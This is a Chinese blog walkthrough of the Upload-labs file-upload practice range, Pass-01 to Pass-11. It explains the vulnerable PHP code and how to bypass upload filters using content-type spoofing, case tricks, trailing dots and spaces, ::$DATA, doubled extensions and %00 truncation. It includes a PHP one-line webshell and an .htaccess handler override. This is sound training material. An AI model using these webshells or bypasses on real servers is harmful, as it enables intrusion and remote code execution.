@@ -1,0 +1,743 @@
+
+ <!DOCTYPE HTML>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  
+    <title>Upload_labs文件上传靶场通关 | Hexo</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1,user-scalable=no">
+    
+    <meta name="author" content="John Doe">
+    
+
+    
+    <meta name="description" content="前言学习一下文件上传">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Upload_labs文件上传靶场通关">
+<meta property="og:url" content="http://example.com/2018/12/20/%E9%9D%B6%E5%9C%BA/Upload-labs%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="前言学习一下文件上传">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://s1.ax1x.com/2018/12/20/FrcdQ1.png">
+<meta property="og:image" content="https://s1.ax1x.com/2018/12/20/Frcfyt.png">
+<meta property="og:image" content="https://s1.ax1x.com/2018/12/20/FrczwT.png">
+<meta property="og:image" content="https://s1.ax1x.com/2018/12/20/FrgFp9.png">
+<meta property="og:image" content="https://s1.ax1x.com/2018/12/20/FrgmTO.png">
+<meta property="og:image" content="https://s1.ax1x.com/2018/12/20/Fr2rPe.png">
+<meta property="og:image" content="https://s1.ax1x.com/2018/12/20/FrRLSH.png">
+<meta property="og:image" content="https://s1.ax1x.com/2018/12/20/FrWlp4.png">
+<meta property="og:image" content="https://s1.ax1x.com/2018/12/20/FrW5cj.png">
+<meta property="og:image" content="https://s1.ax1x.com/2018/12/20/Frf2rR.png">
+<meta property="og:image" content="https://s1.ax1x.com/2018/12/20/FrhGo6.png">
+<meta property="og:image" content="https://s1.ax1x.com/2018/12/20/FrhbfU.png">
+<meta property="og:image" content="https://s1.ax1x.com/2018/12/20/FrIwy4.png">
+<meta property="og:image" content="https://s1.ax1x.com/2018/12/20/FrI9zD.png">
+<meta property="og:image" content="https://s1.ax1x.com/2018/12/20/FrIDm9.png">
+<meta property="og:image" content="https://s1.ax1x.com/2018/12/21/FsuHpR.png">
+<meta property="og:image" content="https://s1.ax1x.com/2018/12/21/FsKStH.png">
+<meta property="og:image" content="https://s1.ax1x.com/2018/12/21/FsKEB8.png">
+<meta property="og:image" content="https://s1.ax1x.com/2018/12/21/FsKVHS.png">
+<meta property="og:image" content="https://s1.ax1x.com/2018/12/21/FsKaC9.png">
+<meta property="og:image" content="https://s1.ax1x.com/2018/12/21/FsKDu6.png">
+<meta property="og:image" content="https://s1.ax1x.com/2018/12/21/FsK6ED.png">
+<meta property="og:image" content="https://s1.ax1x.com/2018/12/21/FsKIDf.png">
+<meta property="og:image" content="https://s1.ax1x.com/2018/12/21/FsK7VS.png">
+<meta property="og:image" content="https://s1.ax1x.com/2018/12/21/FsKLCj.png">
+<meta property="og:image" content="https://s1.ax1x.com/2018/12/21/FsKjvq.png">
+<meta property="og:image" content="https://s1.ax1x.com/2018/12/21/FsMKaD.png">
+<meta property="og:image" content="https://s1.ax1x.com/2018/12/21/FsMer6.png">
+<meta property="og:image" content="https://s1.ax1x.com/2018/12/21/FsMDRs.png">
+<meta property="og:image" content="https://s1.ax1x.com/2018/12/21/FsMvJH.png">
+<meta property="og:image" content="https://s1.ax1x.com/2018/12/21/FsQFw8.png">
+<meta property="og:image" content="https://s1.ax1x.com/2018/12/21/FsQHpj.png">
+<meta property="og:image" content="https://s1.ax1x.com/2018/12/21/Fslwgs.png">
+<meta property="og:image" content="https://s1.ax1x.com/2018/12/21/Fs3aXn.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/01/25/km5OQe.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/01/25/knpklj.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/01/25/knpukT.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/01/25/knp43Q.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/01/26/kn3mtS.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/01/26/kn3Mlj.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/01/26/knGCqI.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/01/26/knGaLR.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/01/26/knGLOs.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/01/26/kntVJK.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/01/26/knt0wn.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/01/28/kMawUH.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/01/28/kMd1eS.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/01/28/kMdaQ0.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/01/28/kMwj3R.png">
+<meta property="article:published_time" content="2018-12-20T13:30:47.000Z">
+<meta property="article:modified_time" content="2019-04-12T02:34:15.946Z">
+<meta property="article:author" content="John Doe">
+<meta property="article:tag" content="ctf">
+<meta property="article:tag" content="upload_labs">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://s1.ax1x.com/2018/12/20/FrcdQ1.png">
+
+    
+    <link rel="alternative" href="/atom.xml" title="Hexo" type="application/atom+xml">
+    
+    
+    <link rel="icon" href="/img/tou1.png">
+    
+    
+    <link rel="apple-touch-icon" href="/img/jacman.jpg">
+    <link rel="apple-touch-icon-precomposed" href="/img/jacman.jpg">
+    
+    
+<link rel="stylesheet" href="/css/style.css">
+<link rel="stylesheet" href="/%02.css">
+<link rel="stylesheet" href="/.css">
+
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+  <body>
+    <header>
+      
+<div>
+		
+			<div id="imglogo">
+				<a href="/"><img src="/img/logo.jpg" alt="Hexo" title="Hexo"/></a>
+			</div>
+			
+			<div id="textlogo">
+				<h1 class="site-name"><a href="/" title="Hexo">Hexo</a></h1>
+				<h2 class="blog-motto"></h2>
+			</div>
+			<div class="navbar"><a class="navbutton navmobile" href="#" title="Menu">
+			</a></div>
+			<nav class="animated">
+				<ul>
+					<ul>
+					 
+						<li><a href="/">Home</a></li>
+					
+						<li><a href="/archives">Archives</a></li>
+					
+						<li><a href="/about">About</a></li>
+					
+						<li><a href="/tags">Tags</a></li>
+					
+						<li><a href="/categories">Categories</a></li>
+					
+					<li>
+ 					
+					<form class="search" action="//google.com/search" method="get" accept-charset="utf-8">
+						<label>Search</label>
+						<input type="search" id="search" name="q" autocomplete="off" maxlength="20" placeholder="Search" />
+						<input type="hidden" name="q" value="site:example.com">
+					</form>
+					
+					</li>
+				</ul>
+			</nav>			
+</div>
+    </header>
+    <div id="container">
+      <div id="main" class="post" itemscope itemprop="blogPost">
+  
+	<article itemprop="articleBody"> 
+		<header class="article-info clearfix">
+  <h1 itemprop="name">
+    
+      <a href="/2018/12/20/靶场/Upload-labs文件上传靶场通关/" title="Upload_labs文件上传靶场通关" itemprop="url">Upload_labs文件上传靶场通关</a>
+  </h1>
+  <p class="article-author">By
+       
+		<a href="/about" title="John Doe" target="_blank" itemprop="author">John Doe</a>
+		
+  <p class="article-time">
+    <time datetime="2018-12-20T13:30:47.000Z" itemprop="datePublished"> Published 2018-12-20</time>
+    
+  </p>
+</header>
+	<div class="article-content">
+		
+		<div id="toc" class="toc-article">
+			<strong class="toc-title">Contents</strong>
+		
+			<ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Pass-01"><span class="toc-number">2.</span> <span class="toc-text">Pass-01</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Pass-02"><span class="toc-number">3.</span> <span class="toc-text">Pass-02</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Pass-03"><span class="toc-number">4.</span> <span class="toc-text">Pass-03</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Pass-04"><span class="toc-number">5.</span> <span class="toc-text">Pass-04</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Pass-05"><span class="toc-number">6.</span> <span class="toc-text">Pass-05</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Pass-06"><span class="toc-number">7.</span> <span class="toc-text">Pass-06</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Pass-07"><span class="toc-number">8.</span> <span class="toc-text">Pass-07</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Pass-08"><span class="toc-number">9.</span> <span class="toc-text">Pass-08</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Pass-09"><span class="toc-number">10.</span> <span class="toc-text">Pass-09</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Pass-10"><span class="toc-number">11.</span> <span class="toc-text">Pass-10</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Pass-11-00%E6%88%AA%E6%96%AD-GET"><span class="toc-number">12.</span> <span class="toc-text">Pass-11(00截断$_GET)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Pass-12-00%E6%88%AA%E6%96%AD-POST"><span class="toc-number">13.</span> <span class="toc-text">Pass-12(00截断$_POST)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Pass-13"><span class="toc-number">14.</span> <span class="toc-text">Pass-13</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Pass-14"><span class="toc-number">15.</span> <span class="toc-text">Pass-14</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Pass-15"><span class="toc-number">16.</span> <span class="toc-text">Pass-15</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Pass-16"><span class="toc-number">17.</span> <span class="toc-text">Pass-16</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Pass-17"><span class="toc-number">18.</span> <span class="toc-text">Pass-17</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Pass-18"><span class="toc-number">19.</span> <span class="toc-text">Pass-18</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Pass-19-CVE-2015-2348-move-uploaded-file-00%E6%88%AA%E6%96%AD"><span class="toc-number">20.</span> <span class="toc-text">Pass-19(CVE-2015-2348 move_uploaded_file() 00截断)</span></a></li></ol>
+		
+		</div>
+		
+		<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>学习一下文件上传<span id="more"></span></p>
+<h3 id="Pass-01"><a href="#Pass-01" class="headerlink" title="Pass-01"></a>Pass-01</h3><p>这题的目的是前端的绕过</p>
+<p>打开题目，试一下，随便上传一张图片，可以成功上传<br><img src="https://s1.ax1x.com/2018/12/20/FrcdQ1.png" alt="FrcdQ1.png"></p>
+<p>打开代理，bp抓包，上传含有一句话木马的1.php，发现一个问题<br>此时，已经打开了代理，bp把流量截了下来，但是却给出了，错误提示，说明这是一个JS前段验证<br><img src="https://s1.ax1x.com/2018/12/20/Frcfyt.png" alt="Frcfyt.png"></p>
+<p>F12修改前端代码，添加.php文件的验证<br><img src="https://s1.ax1x.com/2018/12/20/FrczwT.png" alt="FrczwT.png"></p>
+<p>即可成功，也可以禁用js，也可以成功上传.php文件，然后用菜刀连接即可</p>
+<p>修改后缀名也可以绕过，<br>上传一句话木马,文件名为ee.jpg</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php eval($_Psot[&#x27;ee&#x27;]); ?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>bp抓包后，修改后缀名为.php,即可成功上传.php文件<br><img src="https://s1.ax1x.com/2018/12/20/FrgFp9.png" alt="FrgFp9.png"><br><img src="https://s1.ax1x.com/2018/12/20/FrgmTO.png" alt="FrgmTO.png"></p>
+<p>使用菜刀连接即可，<br><img src="https://s1.ax1x.com/2018/12/20/Fr2rPe.png" alt="Fr2rPe.png"></p>
+<h3 id="Pass-02"><a href="#Pass-02" class="headerlink" title="Pass-02"></a>Pass-02</h3><p>查看源码，发现仅仅判断content-type，于是修改content-type绕过<br><img src="https://s1.ax1x.com/2018/12/20/FrRLSH.png" alt="FrRLSH.png"></p>
+<p>修改为image/jpeg、image/png、image/gif任何一个都可以，就可以成功上传.php文件<br><img src="https://s1.ax1x.com/2018/12/20/FrWlp4.png" alt="FrWlp4.png"><br><img src="https://s1.ax1x.com/2018/12/20/FrW5cj.png" alt="FrW5cj.png"></p>
+<p>bp抓包，修改文件后缀名也可以</p>
+<h3 id="Pass-03"><a href="#Pass-03" class="headerlink" title="Pass-03"></a>Pass-03</h3><p>查看源码，发现是黑名单验证，对.asp|.aspx|.php|.jsp后缀名进行了严格的限制</p>
+<p><img src="https://s1.ax1x.com/2018/12/20/Frf2rR.png" alt="Frf2rR.png"></p>
+<p>只能上传别的类型，于是尝试用php3,phtml绕过，都可以成功上传<br><img src="https://s1.ax1x.com/2018/12/20/FrhGo6.png" alt="FrhGo6.png"></p>
+<p>源码解析</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>; </span><br><span class="line"><span class="variable">$msg</span> = null; </span><br><span class="line"><span class="keyword">if</span> (isset(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) </span><br><span class="line">&#123; </span><br><span class="line">	<span class="keyword">if</span> (file_exists(UPLOAD_PATH))</span><br><span class="line">	 &#123; </span><br><span class="line">	 	<span class="variable">$deny_ext</span> = array(<span class="string">&#x27;.asp&#x27;</span>,<span class="string">&#x27;.aspx&#x27;</span>,<span class="string">&#x27;.php&#x27;</span>,<span class="string">&#x27;.jsp&#x27;</span>); </span><br><span class="line">	 	<span class="variable">$file_name</span> = trim(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);//trim()去点文件的空格 <span class="variable">$file_name</span> = deldot(<span class="variable">$file_name</span>);//删除文件名末尾的点 </span><br><span class="line">	 	<span class="variable">$file_ext</span> = strrchr(<span class="variable">$file_name</span>, <span class="string">&#x27;.&#x27;</span>);//查找字符在指定字符串中从左面开始的最后一次出现的位置，如果成功，返回该字符以及其后面的字符 </span><br><span class="line"></span><br><span class="line">	 	<span class="variable">$file_ext</span> = strtolower(<span class="variable">$file_ext</span>); //转换为小写这样就不能进行大小写的逃逸了 <span class="variable">$file_ext</span> = str_ireplace(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$file_ext</span>);//去除字符串::<span class="variable">$DATA</span> <span class="variable">$file_ext</span> = trim(<span class="variable">$file_ext</span>); //收尾去空 </span><br><span class="line"></span><br><span class="line">	 	<span class="keyword">if</span>(!in_array(<span class="variable">$file_ext</span>, <span class="variable">$deny_ext</span>)) </span><br><span class="line">	 	&#123; </span><br><span class="line">	 		<span class="keyword">if</span> (move_uploaded_file(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>], UPLOAD_PATH. <span class="string">&#x27;/&#x27;</span> . <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>])) </span><br><span class="line">	 		&#123; <span class="variable">$img_path</span> = UPLOAD_PATH .<span class="string">&#x27;/&#x27;</span>. <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]; <span class="variable">$is_upload</span> = <span class="literal">true</span>; </span><br><span class="line">	 		&#125; </span><br><span class="line">	 		&#125; </span><br><span class="line">	 		<span class="keyword">else</span></span><br><span class="line">	 		 &#123; </span><br><span class="line">	 		 	<span class="variable">$msg</span> = <span class="string">&#x27;不允许上传.asp,.aspx,.php,.jsp后缀文件！&#x27;</span>; </span><br><span class="line">	 		 &#125; </span><br><span class="line">	 		 	&#125; <span class="keyword">else</span> &#123; <span class="variable">$msg</span> = UPLOAD_PATH . <span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>; </span><br><span class="line">	 		 	&#125; </span><br><span class="line">	 		 &#125;</span><br><span class="line">//原文：https://blog.csdn.net/qq_29647709/article/details/81227084 </span><br></pre></td></tr></table></figure>
+
+<h3 id="Pass-04"><a href="#Pass-04" class="headerlink" title="Pass-04"></a>Pass-04</h3><p>也是一个黑名单验证，强度更大，几乎过滤了所有的后缀名,除了.htaccess</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;php1&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pht&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;pHp1&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;</span><br></pre></td></tr></table></figure>
+<p><img src="https://s1.ax1x.com/2018/12/20/FrhbfU.png" alt="FrhbfU.png"></p>
+<p>.htaccess文件,全称是Hypertext Access(超文本入口)。提供了针对目录改变配置的方法， 即在一个特定的文档目录中放置一个包含一个或多个指令的文件， 以作用于此目录及其所有子目录。作为用户，所能使用的命令受到限制。管理员可以通过Apache的AllowOverride指令来设置。</p>
+<p>上传一个.htaccess文件，在里面写入</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SetHandler application/x-httpd-php</span><br></pre></td></tr></table></figure>
+<p><img src="https://s1.ax1x.com/2018/12/20/FrIwy4.png" alt="FrIwy4.png"></p>
+<p>这样所有文件都会解析为php，然后再上传图片马，就可以成功解析：<br><img src="https://s1.ax1x.com/2018/12/20/FrI9zD.png" alt="FrI9zD.png"></p>
+<p>可以成功访问，说明解析成功<br><img src="https://s1.ax1x.com/2018/12/20/FrIDm9.png" alt="FrIDm9.png"></p>
+<h3 id="Pass-05"><a href="#Pass-05" class="headerlink" title="Pass-05"></a>Pass-05</h3><p>看了一下源码，发现黑名单所有后缀名都被过滤了，也包括.htacces</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pht&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;</span><br></pre></td></tr></table></figure>
+
+<p>但是，和前面的比较一下，少了一行将将后缀进行大小写统一的代码<br>pass-5<br><img src="https://s1.ax1x.com/2018/12/21/FsuHpR.png" alt="FsuHpR.png"><br>pass-4<br><img src="https://s1.ax1x.com/2018/12/21/FsKStH.png" alt="FsKStH.png"></p>
+<p>所以，可以通过大小写绕过<br><img src="https://s1.ax1x.com/2018/12/21/FsKEB8.png" alt="FsKEB8.png"><br>成功上传<br><img src="https://s1.ax1x.com/2018/12/21/FsKVHS.png" alt="FsKVHS.png"></p>
+<h3 id="Pass-06"><a href="#Pass-06" class="headerlink" title="Pass-06"></a>Pass-06</h3><p>查看源码，黑名单<br><img src="https://s1.ax1x.com/2018/12/21/FsKaC9.png" alt="FsKaC9.png"></p>
+<p>可以发现，没有对后缀名进行去空处理，可在后缀名中加空绕过：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$file_ext = trim($file_ext); //首尾去空</span><br></pre></td></tr></table></figure>
+<p><img src="https://s1.ax1x.com/2018/12/21/FsKDu6.png" alt="FsKDu6.png"><br>上传成功<br><img src="https://s1.ax1x.com/2018/12/21/FsK6ED.png" alt="FsK6ED.png"></p>
+<h3 id="Pass-07"><a href="#Pass-07" class="headerlink" title="Pass-07"></a>Pass-07</h3><p>查看源码，黑名单<br><img src="https://s1.ax1x.com/2018/12/21/FsKIDf.png" alt="FsKIDf.png"></p>
+<p>可以发现，没有对后缀名进行去”.”处理，利用windows特性，会自动去掉后缀名中最后的”.”，可在后缀名中加”.”绕过</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$file_name = deldot($file_name);//删除文件名末尾的点</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://s1.ax1x.com/2018/12/21/FsK7VS.png" alt="FsK7VS.png"><br>上传成功<br><img src="https://s1.ax1x.com/2018/12/21/FsKLCj.png" alt="FsKLCj.png"></p>
+<h3 id="Pass-08"><a href="#Pass-08" class="headerlink" title="Pass-08"></a>Pass-08</h3><p>查看源码，黑名单<br><img src="https://s1.ax1x.com/2018/12/21/FsKjvq.png" alt="FsKjvq.png"></p>
+<p>没有进行去除字符串::$DATA的操作，所以，可以在后缀名添加::$DATA来绕过：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$file_ext = str_ireplace(&#x27;::$DATA&#x27;, &#x27;&#x27;, $file_ext);//去除字符串::$DATA</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://s1.ax1x.com/2018/12/21/FsMKaD.png" alt="FsMKaD.png"><br>上传成功<br><img src="https://s1.ax1x.com/2018/12/21/FsMer6.png" alt="FsMer6.png"></p>
+<h3 id="Pass-09"><a href="#Pass-09" class="headerlink" title="Pass-09"></a>Pass-09</h3><p>查看源码，黑名单<br><img src="https://s1.ax1x.com/2018/12/21/FsMDRs.png" alt="FsMDRs.png"></p>
+<p>可以发现，源码的第15行，与之前的不一样</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$img_path = UPLOAD_PATH.&#x27;/&#x27;.$file_name;   //这一关的</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$img_path = UPLOAD_PATH.&#x27;/&#x27;.date(&quot;YmdHis&quot;).rand(1000,9999).$file_ext;   //之前的</span><br></pre></td></tr></table></figure>
+
+<p>路径拼接的是<strong>处理后的文件名</strong>，于是构造info.php. . （点+空格+点），经过处理后，文件名变成info.php.，即可绕过。<br><img src="https://s1.ax1x.com/2018/12/21/FsMvJH.png" alt="FsMvJH.png"></p>
+<h3 id="Pass-10"><a href="#Pass-10" class="headerlink" title="Pass-10"></a>Pass-10</h3><p>查看源码，黑名单<br><img src="https://s1.ax1x.com/2018/12/21/FsQFw8.png" alt="FsQFw8.png"></p>
+<p>这两行代码有问题</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$file_name = trim($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;]);</span><br><span class="line">$file_name = str_ireplace($deny_ext,&quot;&quot;, $file_name);</span><br></pre></td></tr></table></figure>
+
+<p>str_ireplace()函数</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">str_ireplace(find,replace,string,count)</span><br><span class="line">参数  描述</span><br><span class="line">find    必需。规定要查找的值。</span><br><span class="line">replace 必需。规定替换 find 中的值的值。</span><br><span class="line">string  必需。规定被搜索的字符串。</span><br><span class="line">count   可选。一个变量，对替换数进行计数。</span><br><span class="line"></span><br><span class="line">原文：https://blog.csdn.net/qq_29647709/article/details/81237032 </span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>注意到，这里是将问题后缀名替换为空，于是可以利用<strong>双写</strong>绕过<br><img src="https://s1.ax1x.com/2018/12/21/FsQHpj.png" alt="FsQHpj.png"></p>
+<h3 id="Pass-11-00截断-GET"><a href="#Pass-11-00截断-GET" class="headerlink" title="Pass-11(00截断$_GET)"></a>Pass-11(00截断$_GET)</h3><p>查看源码，发现是一个白名单，$_GET传参save_path<br><img src="https://s1.ax1x.com/2018/12/21/Fslwgs.png" alt="Fslwgs.png"></p>
+<p>看到是白名单判断，但是$img_path直接拼接，因此可以利用%00截断绕过</p>
+<p>基础补充两个函数：substr()、strrpos()</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">strrpos() 定义和用法 </span><br><span class="line">strrpos() 函数查找字符串在另一字符串中最后一次出现的位置。 注释：strrpos() 函数对大小写敏感。 </span><br><span class="line">相关函数： </span><br><span class="line">stripos() - 查找字符串在另一字符串中第一次出现的位置（不区分大小写） </span><br><span class="line">strpos() - 查找字符串在另一字符串中第一次出现的位置（区分大小写） </span><br><span class="line">strripos() - 查找字符串在另一字符串中最后一次出现的位置（不区分大小写） </span><br><span class="line">语法 </span><br><span class="line">strrpos(string,find,start) </span><br><span class="line">参数 描述 </span><br><span class="line">string 必需。规定被搜索的字符串。 </span><br><span class="line">find 必需。规定要查找的字符。 </span><br><span class="line">start 可选。规定在何处开始搜索。</span><br><span class="line"></span><br><span class="line">原文：https://blog.csdn.net/qq_29647709/article/details/81264120 </span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">substr() 这里写代码片语法 </span><br><span class="line">substr(string,start,length) </span><br><span class="line">参数 描述 </span><br><span class="line">string 必需。规定要返回其中一部分的字符串。 </span><br><span class="line">start 必需。规定在字符串的何处开始。正数 - 在字符串的指定位置开始 负数 - 在从字符串结尾开始的指定位置开始0 - 在字符串中的第一个字符处开始 length 可选。规定被返回字符串的长度。默认是直到字符串的结尾。正数 - 从 start 参数所在的位置返回的长度负数 - 从字符串末端返回的长度</span><br><span class="line"></span><br><span class="line">原文：https://blog.csdn.net/qq_29647709/article/details/81264120 </span><br></pre></td></tr></table></figure>
+
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">截断条件：</span><br><span class="line">    php版本小于5.3.4 详情关注CVE-2006-7243</span><br><span class="line">    php的参数开关上设置里magic_quotes_gpc为OFF状态</span><br></pre></td></tr></table></figure>
+
+<p>设置完成后，即可成功绕过，<br><img src="https://s1.ax1x.com/2018/12/21/Fs3aXn.png" alt="Fs3aXn.png"></p>
+<p>详情查看：<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_29647709/article/details/81264120">https://blog.csdn.net/qq_29647709/article/details/81264120</a> </p>
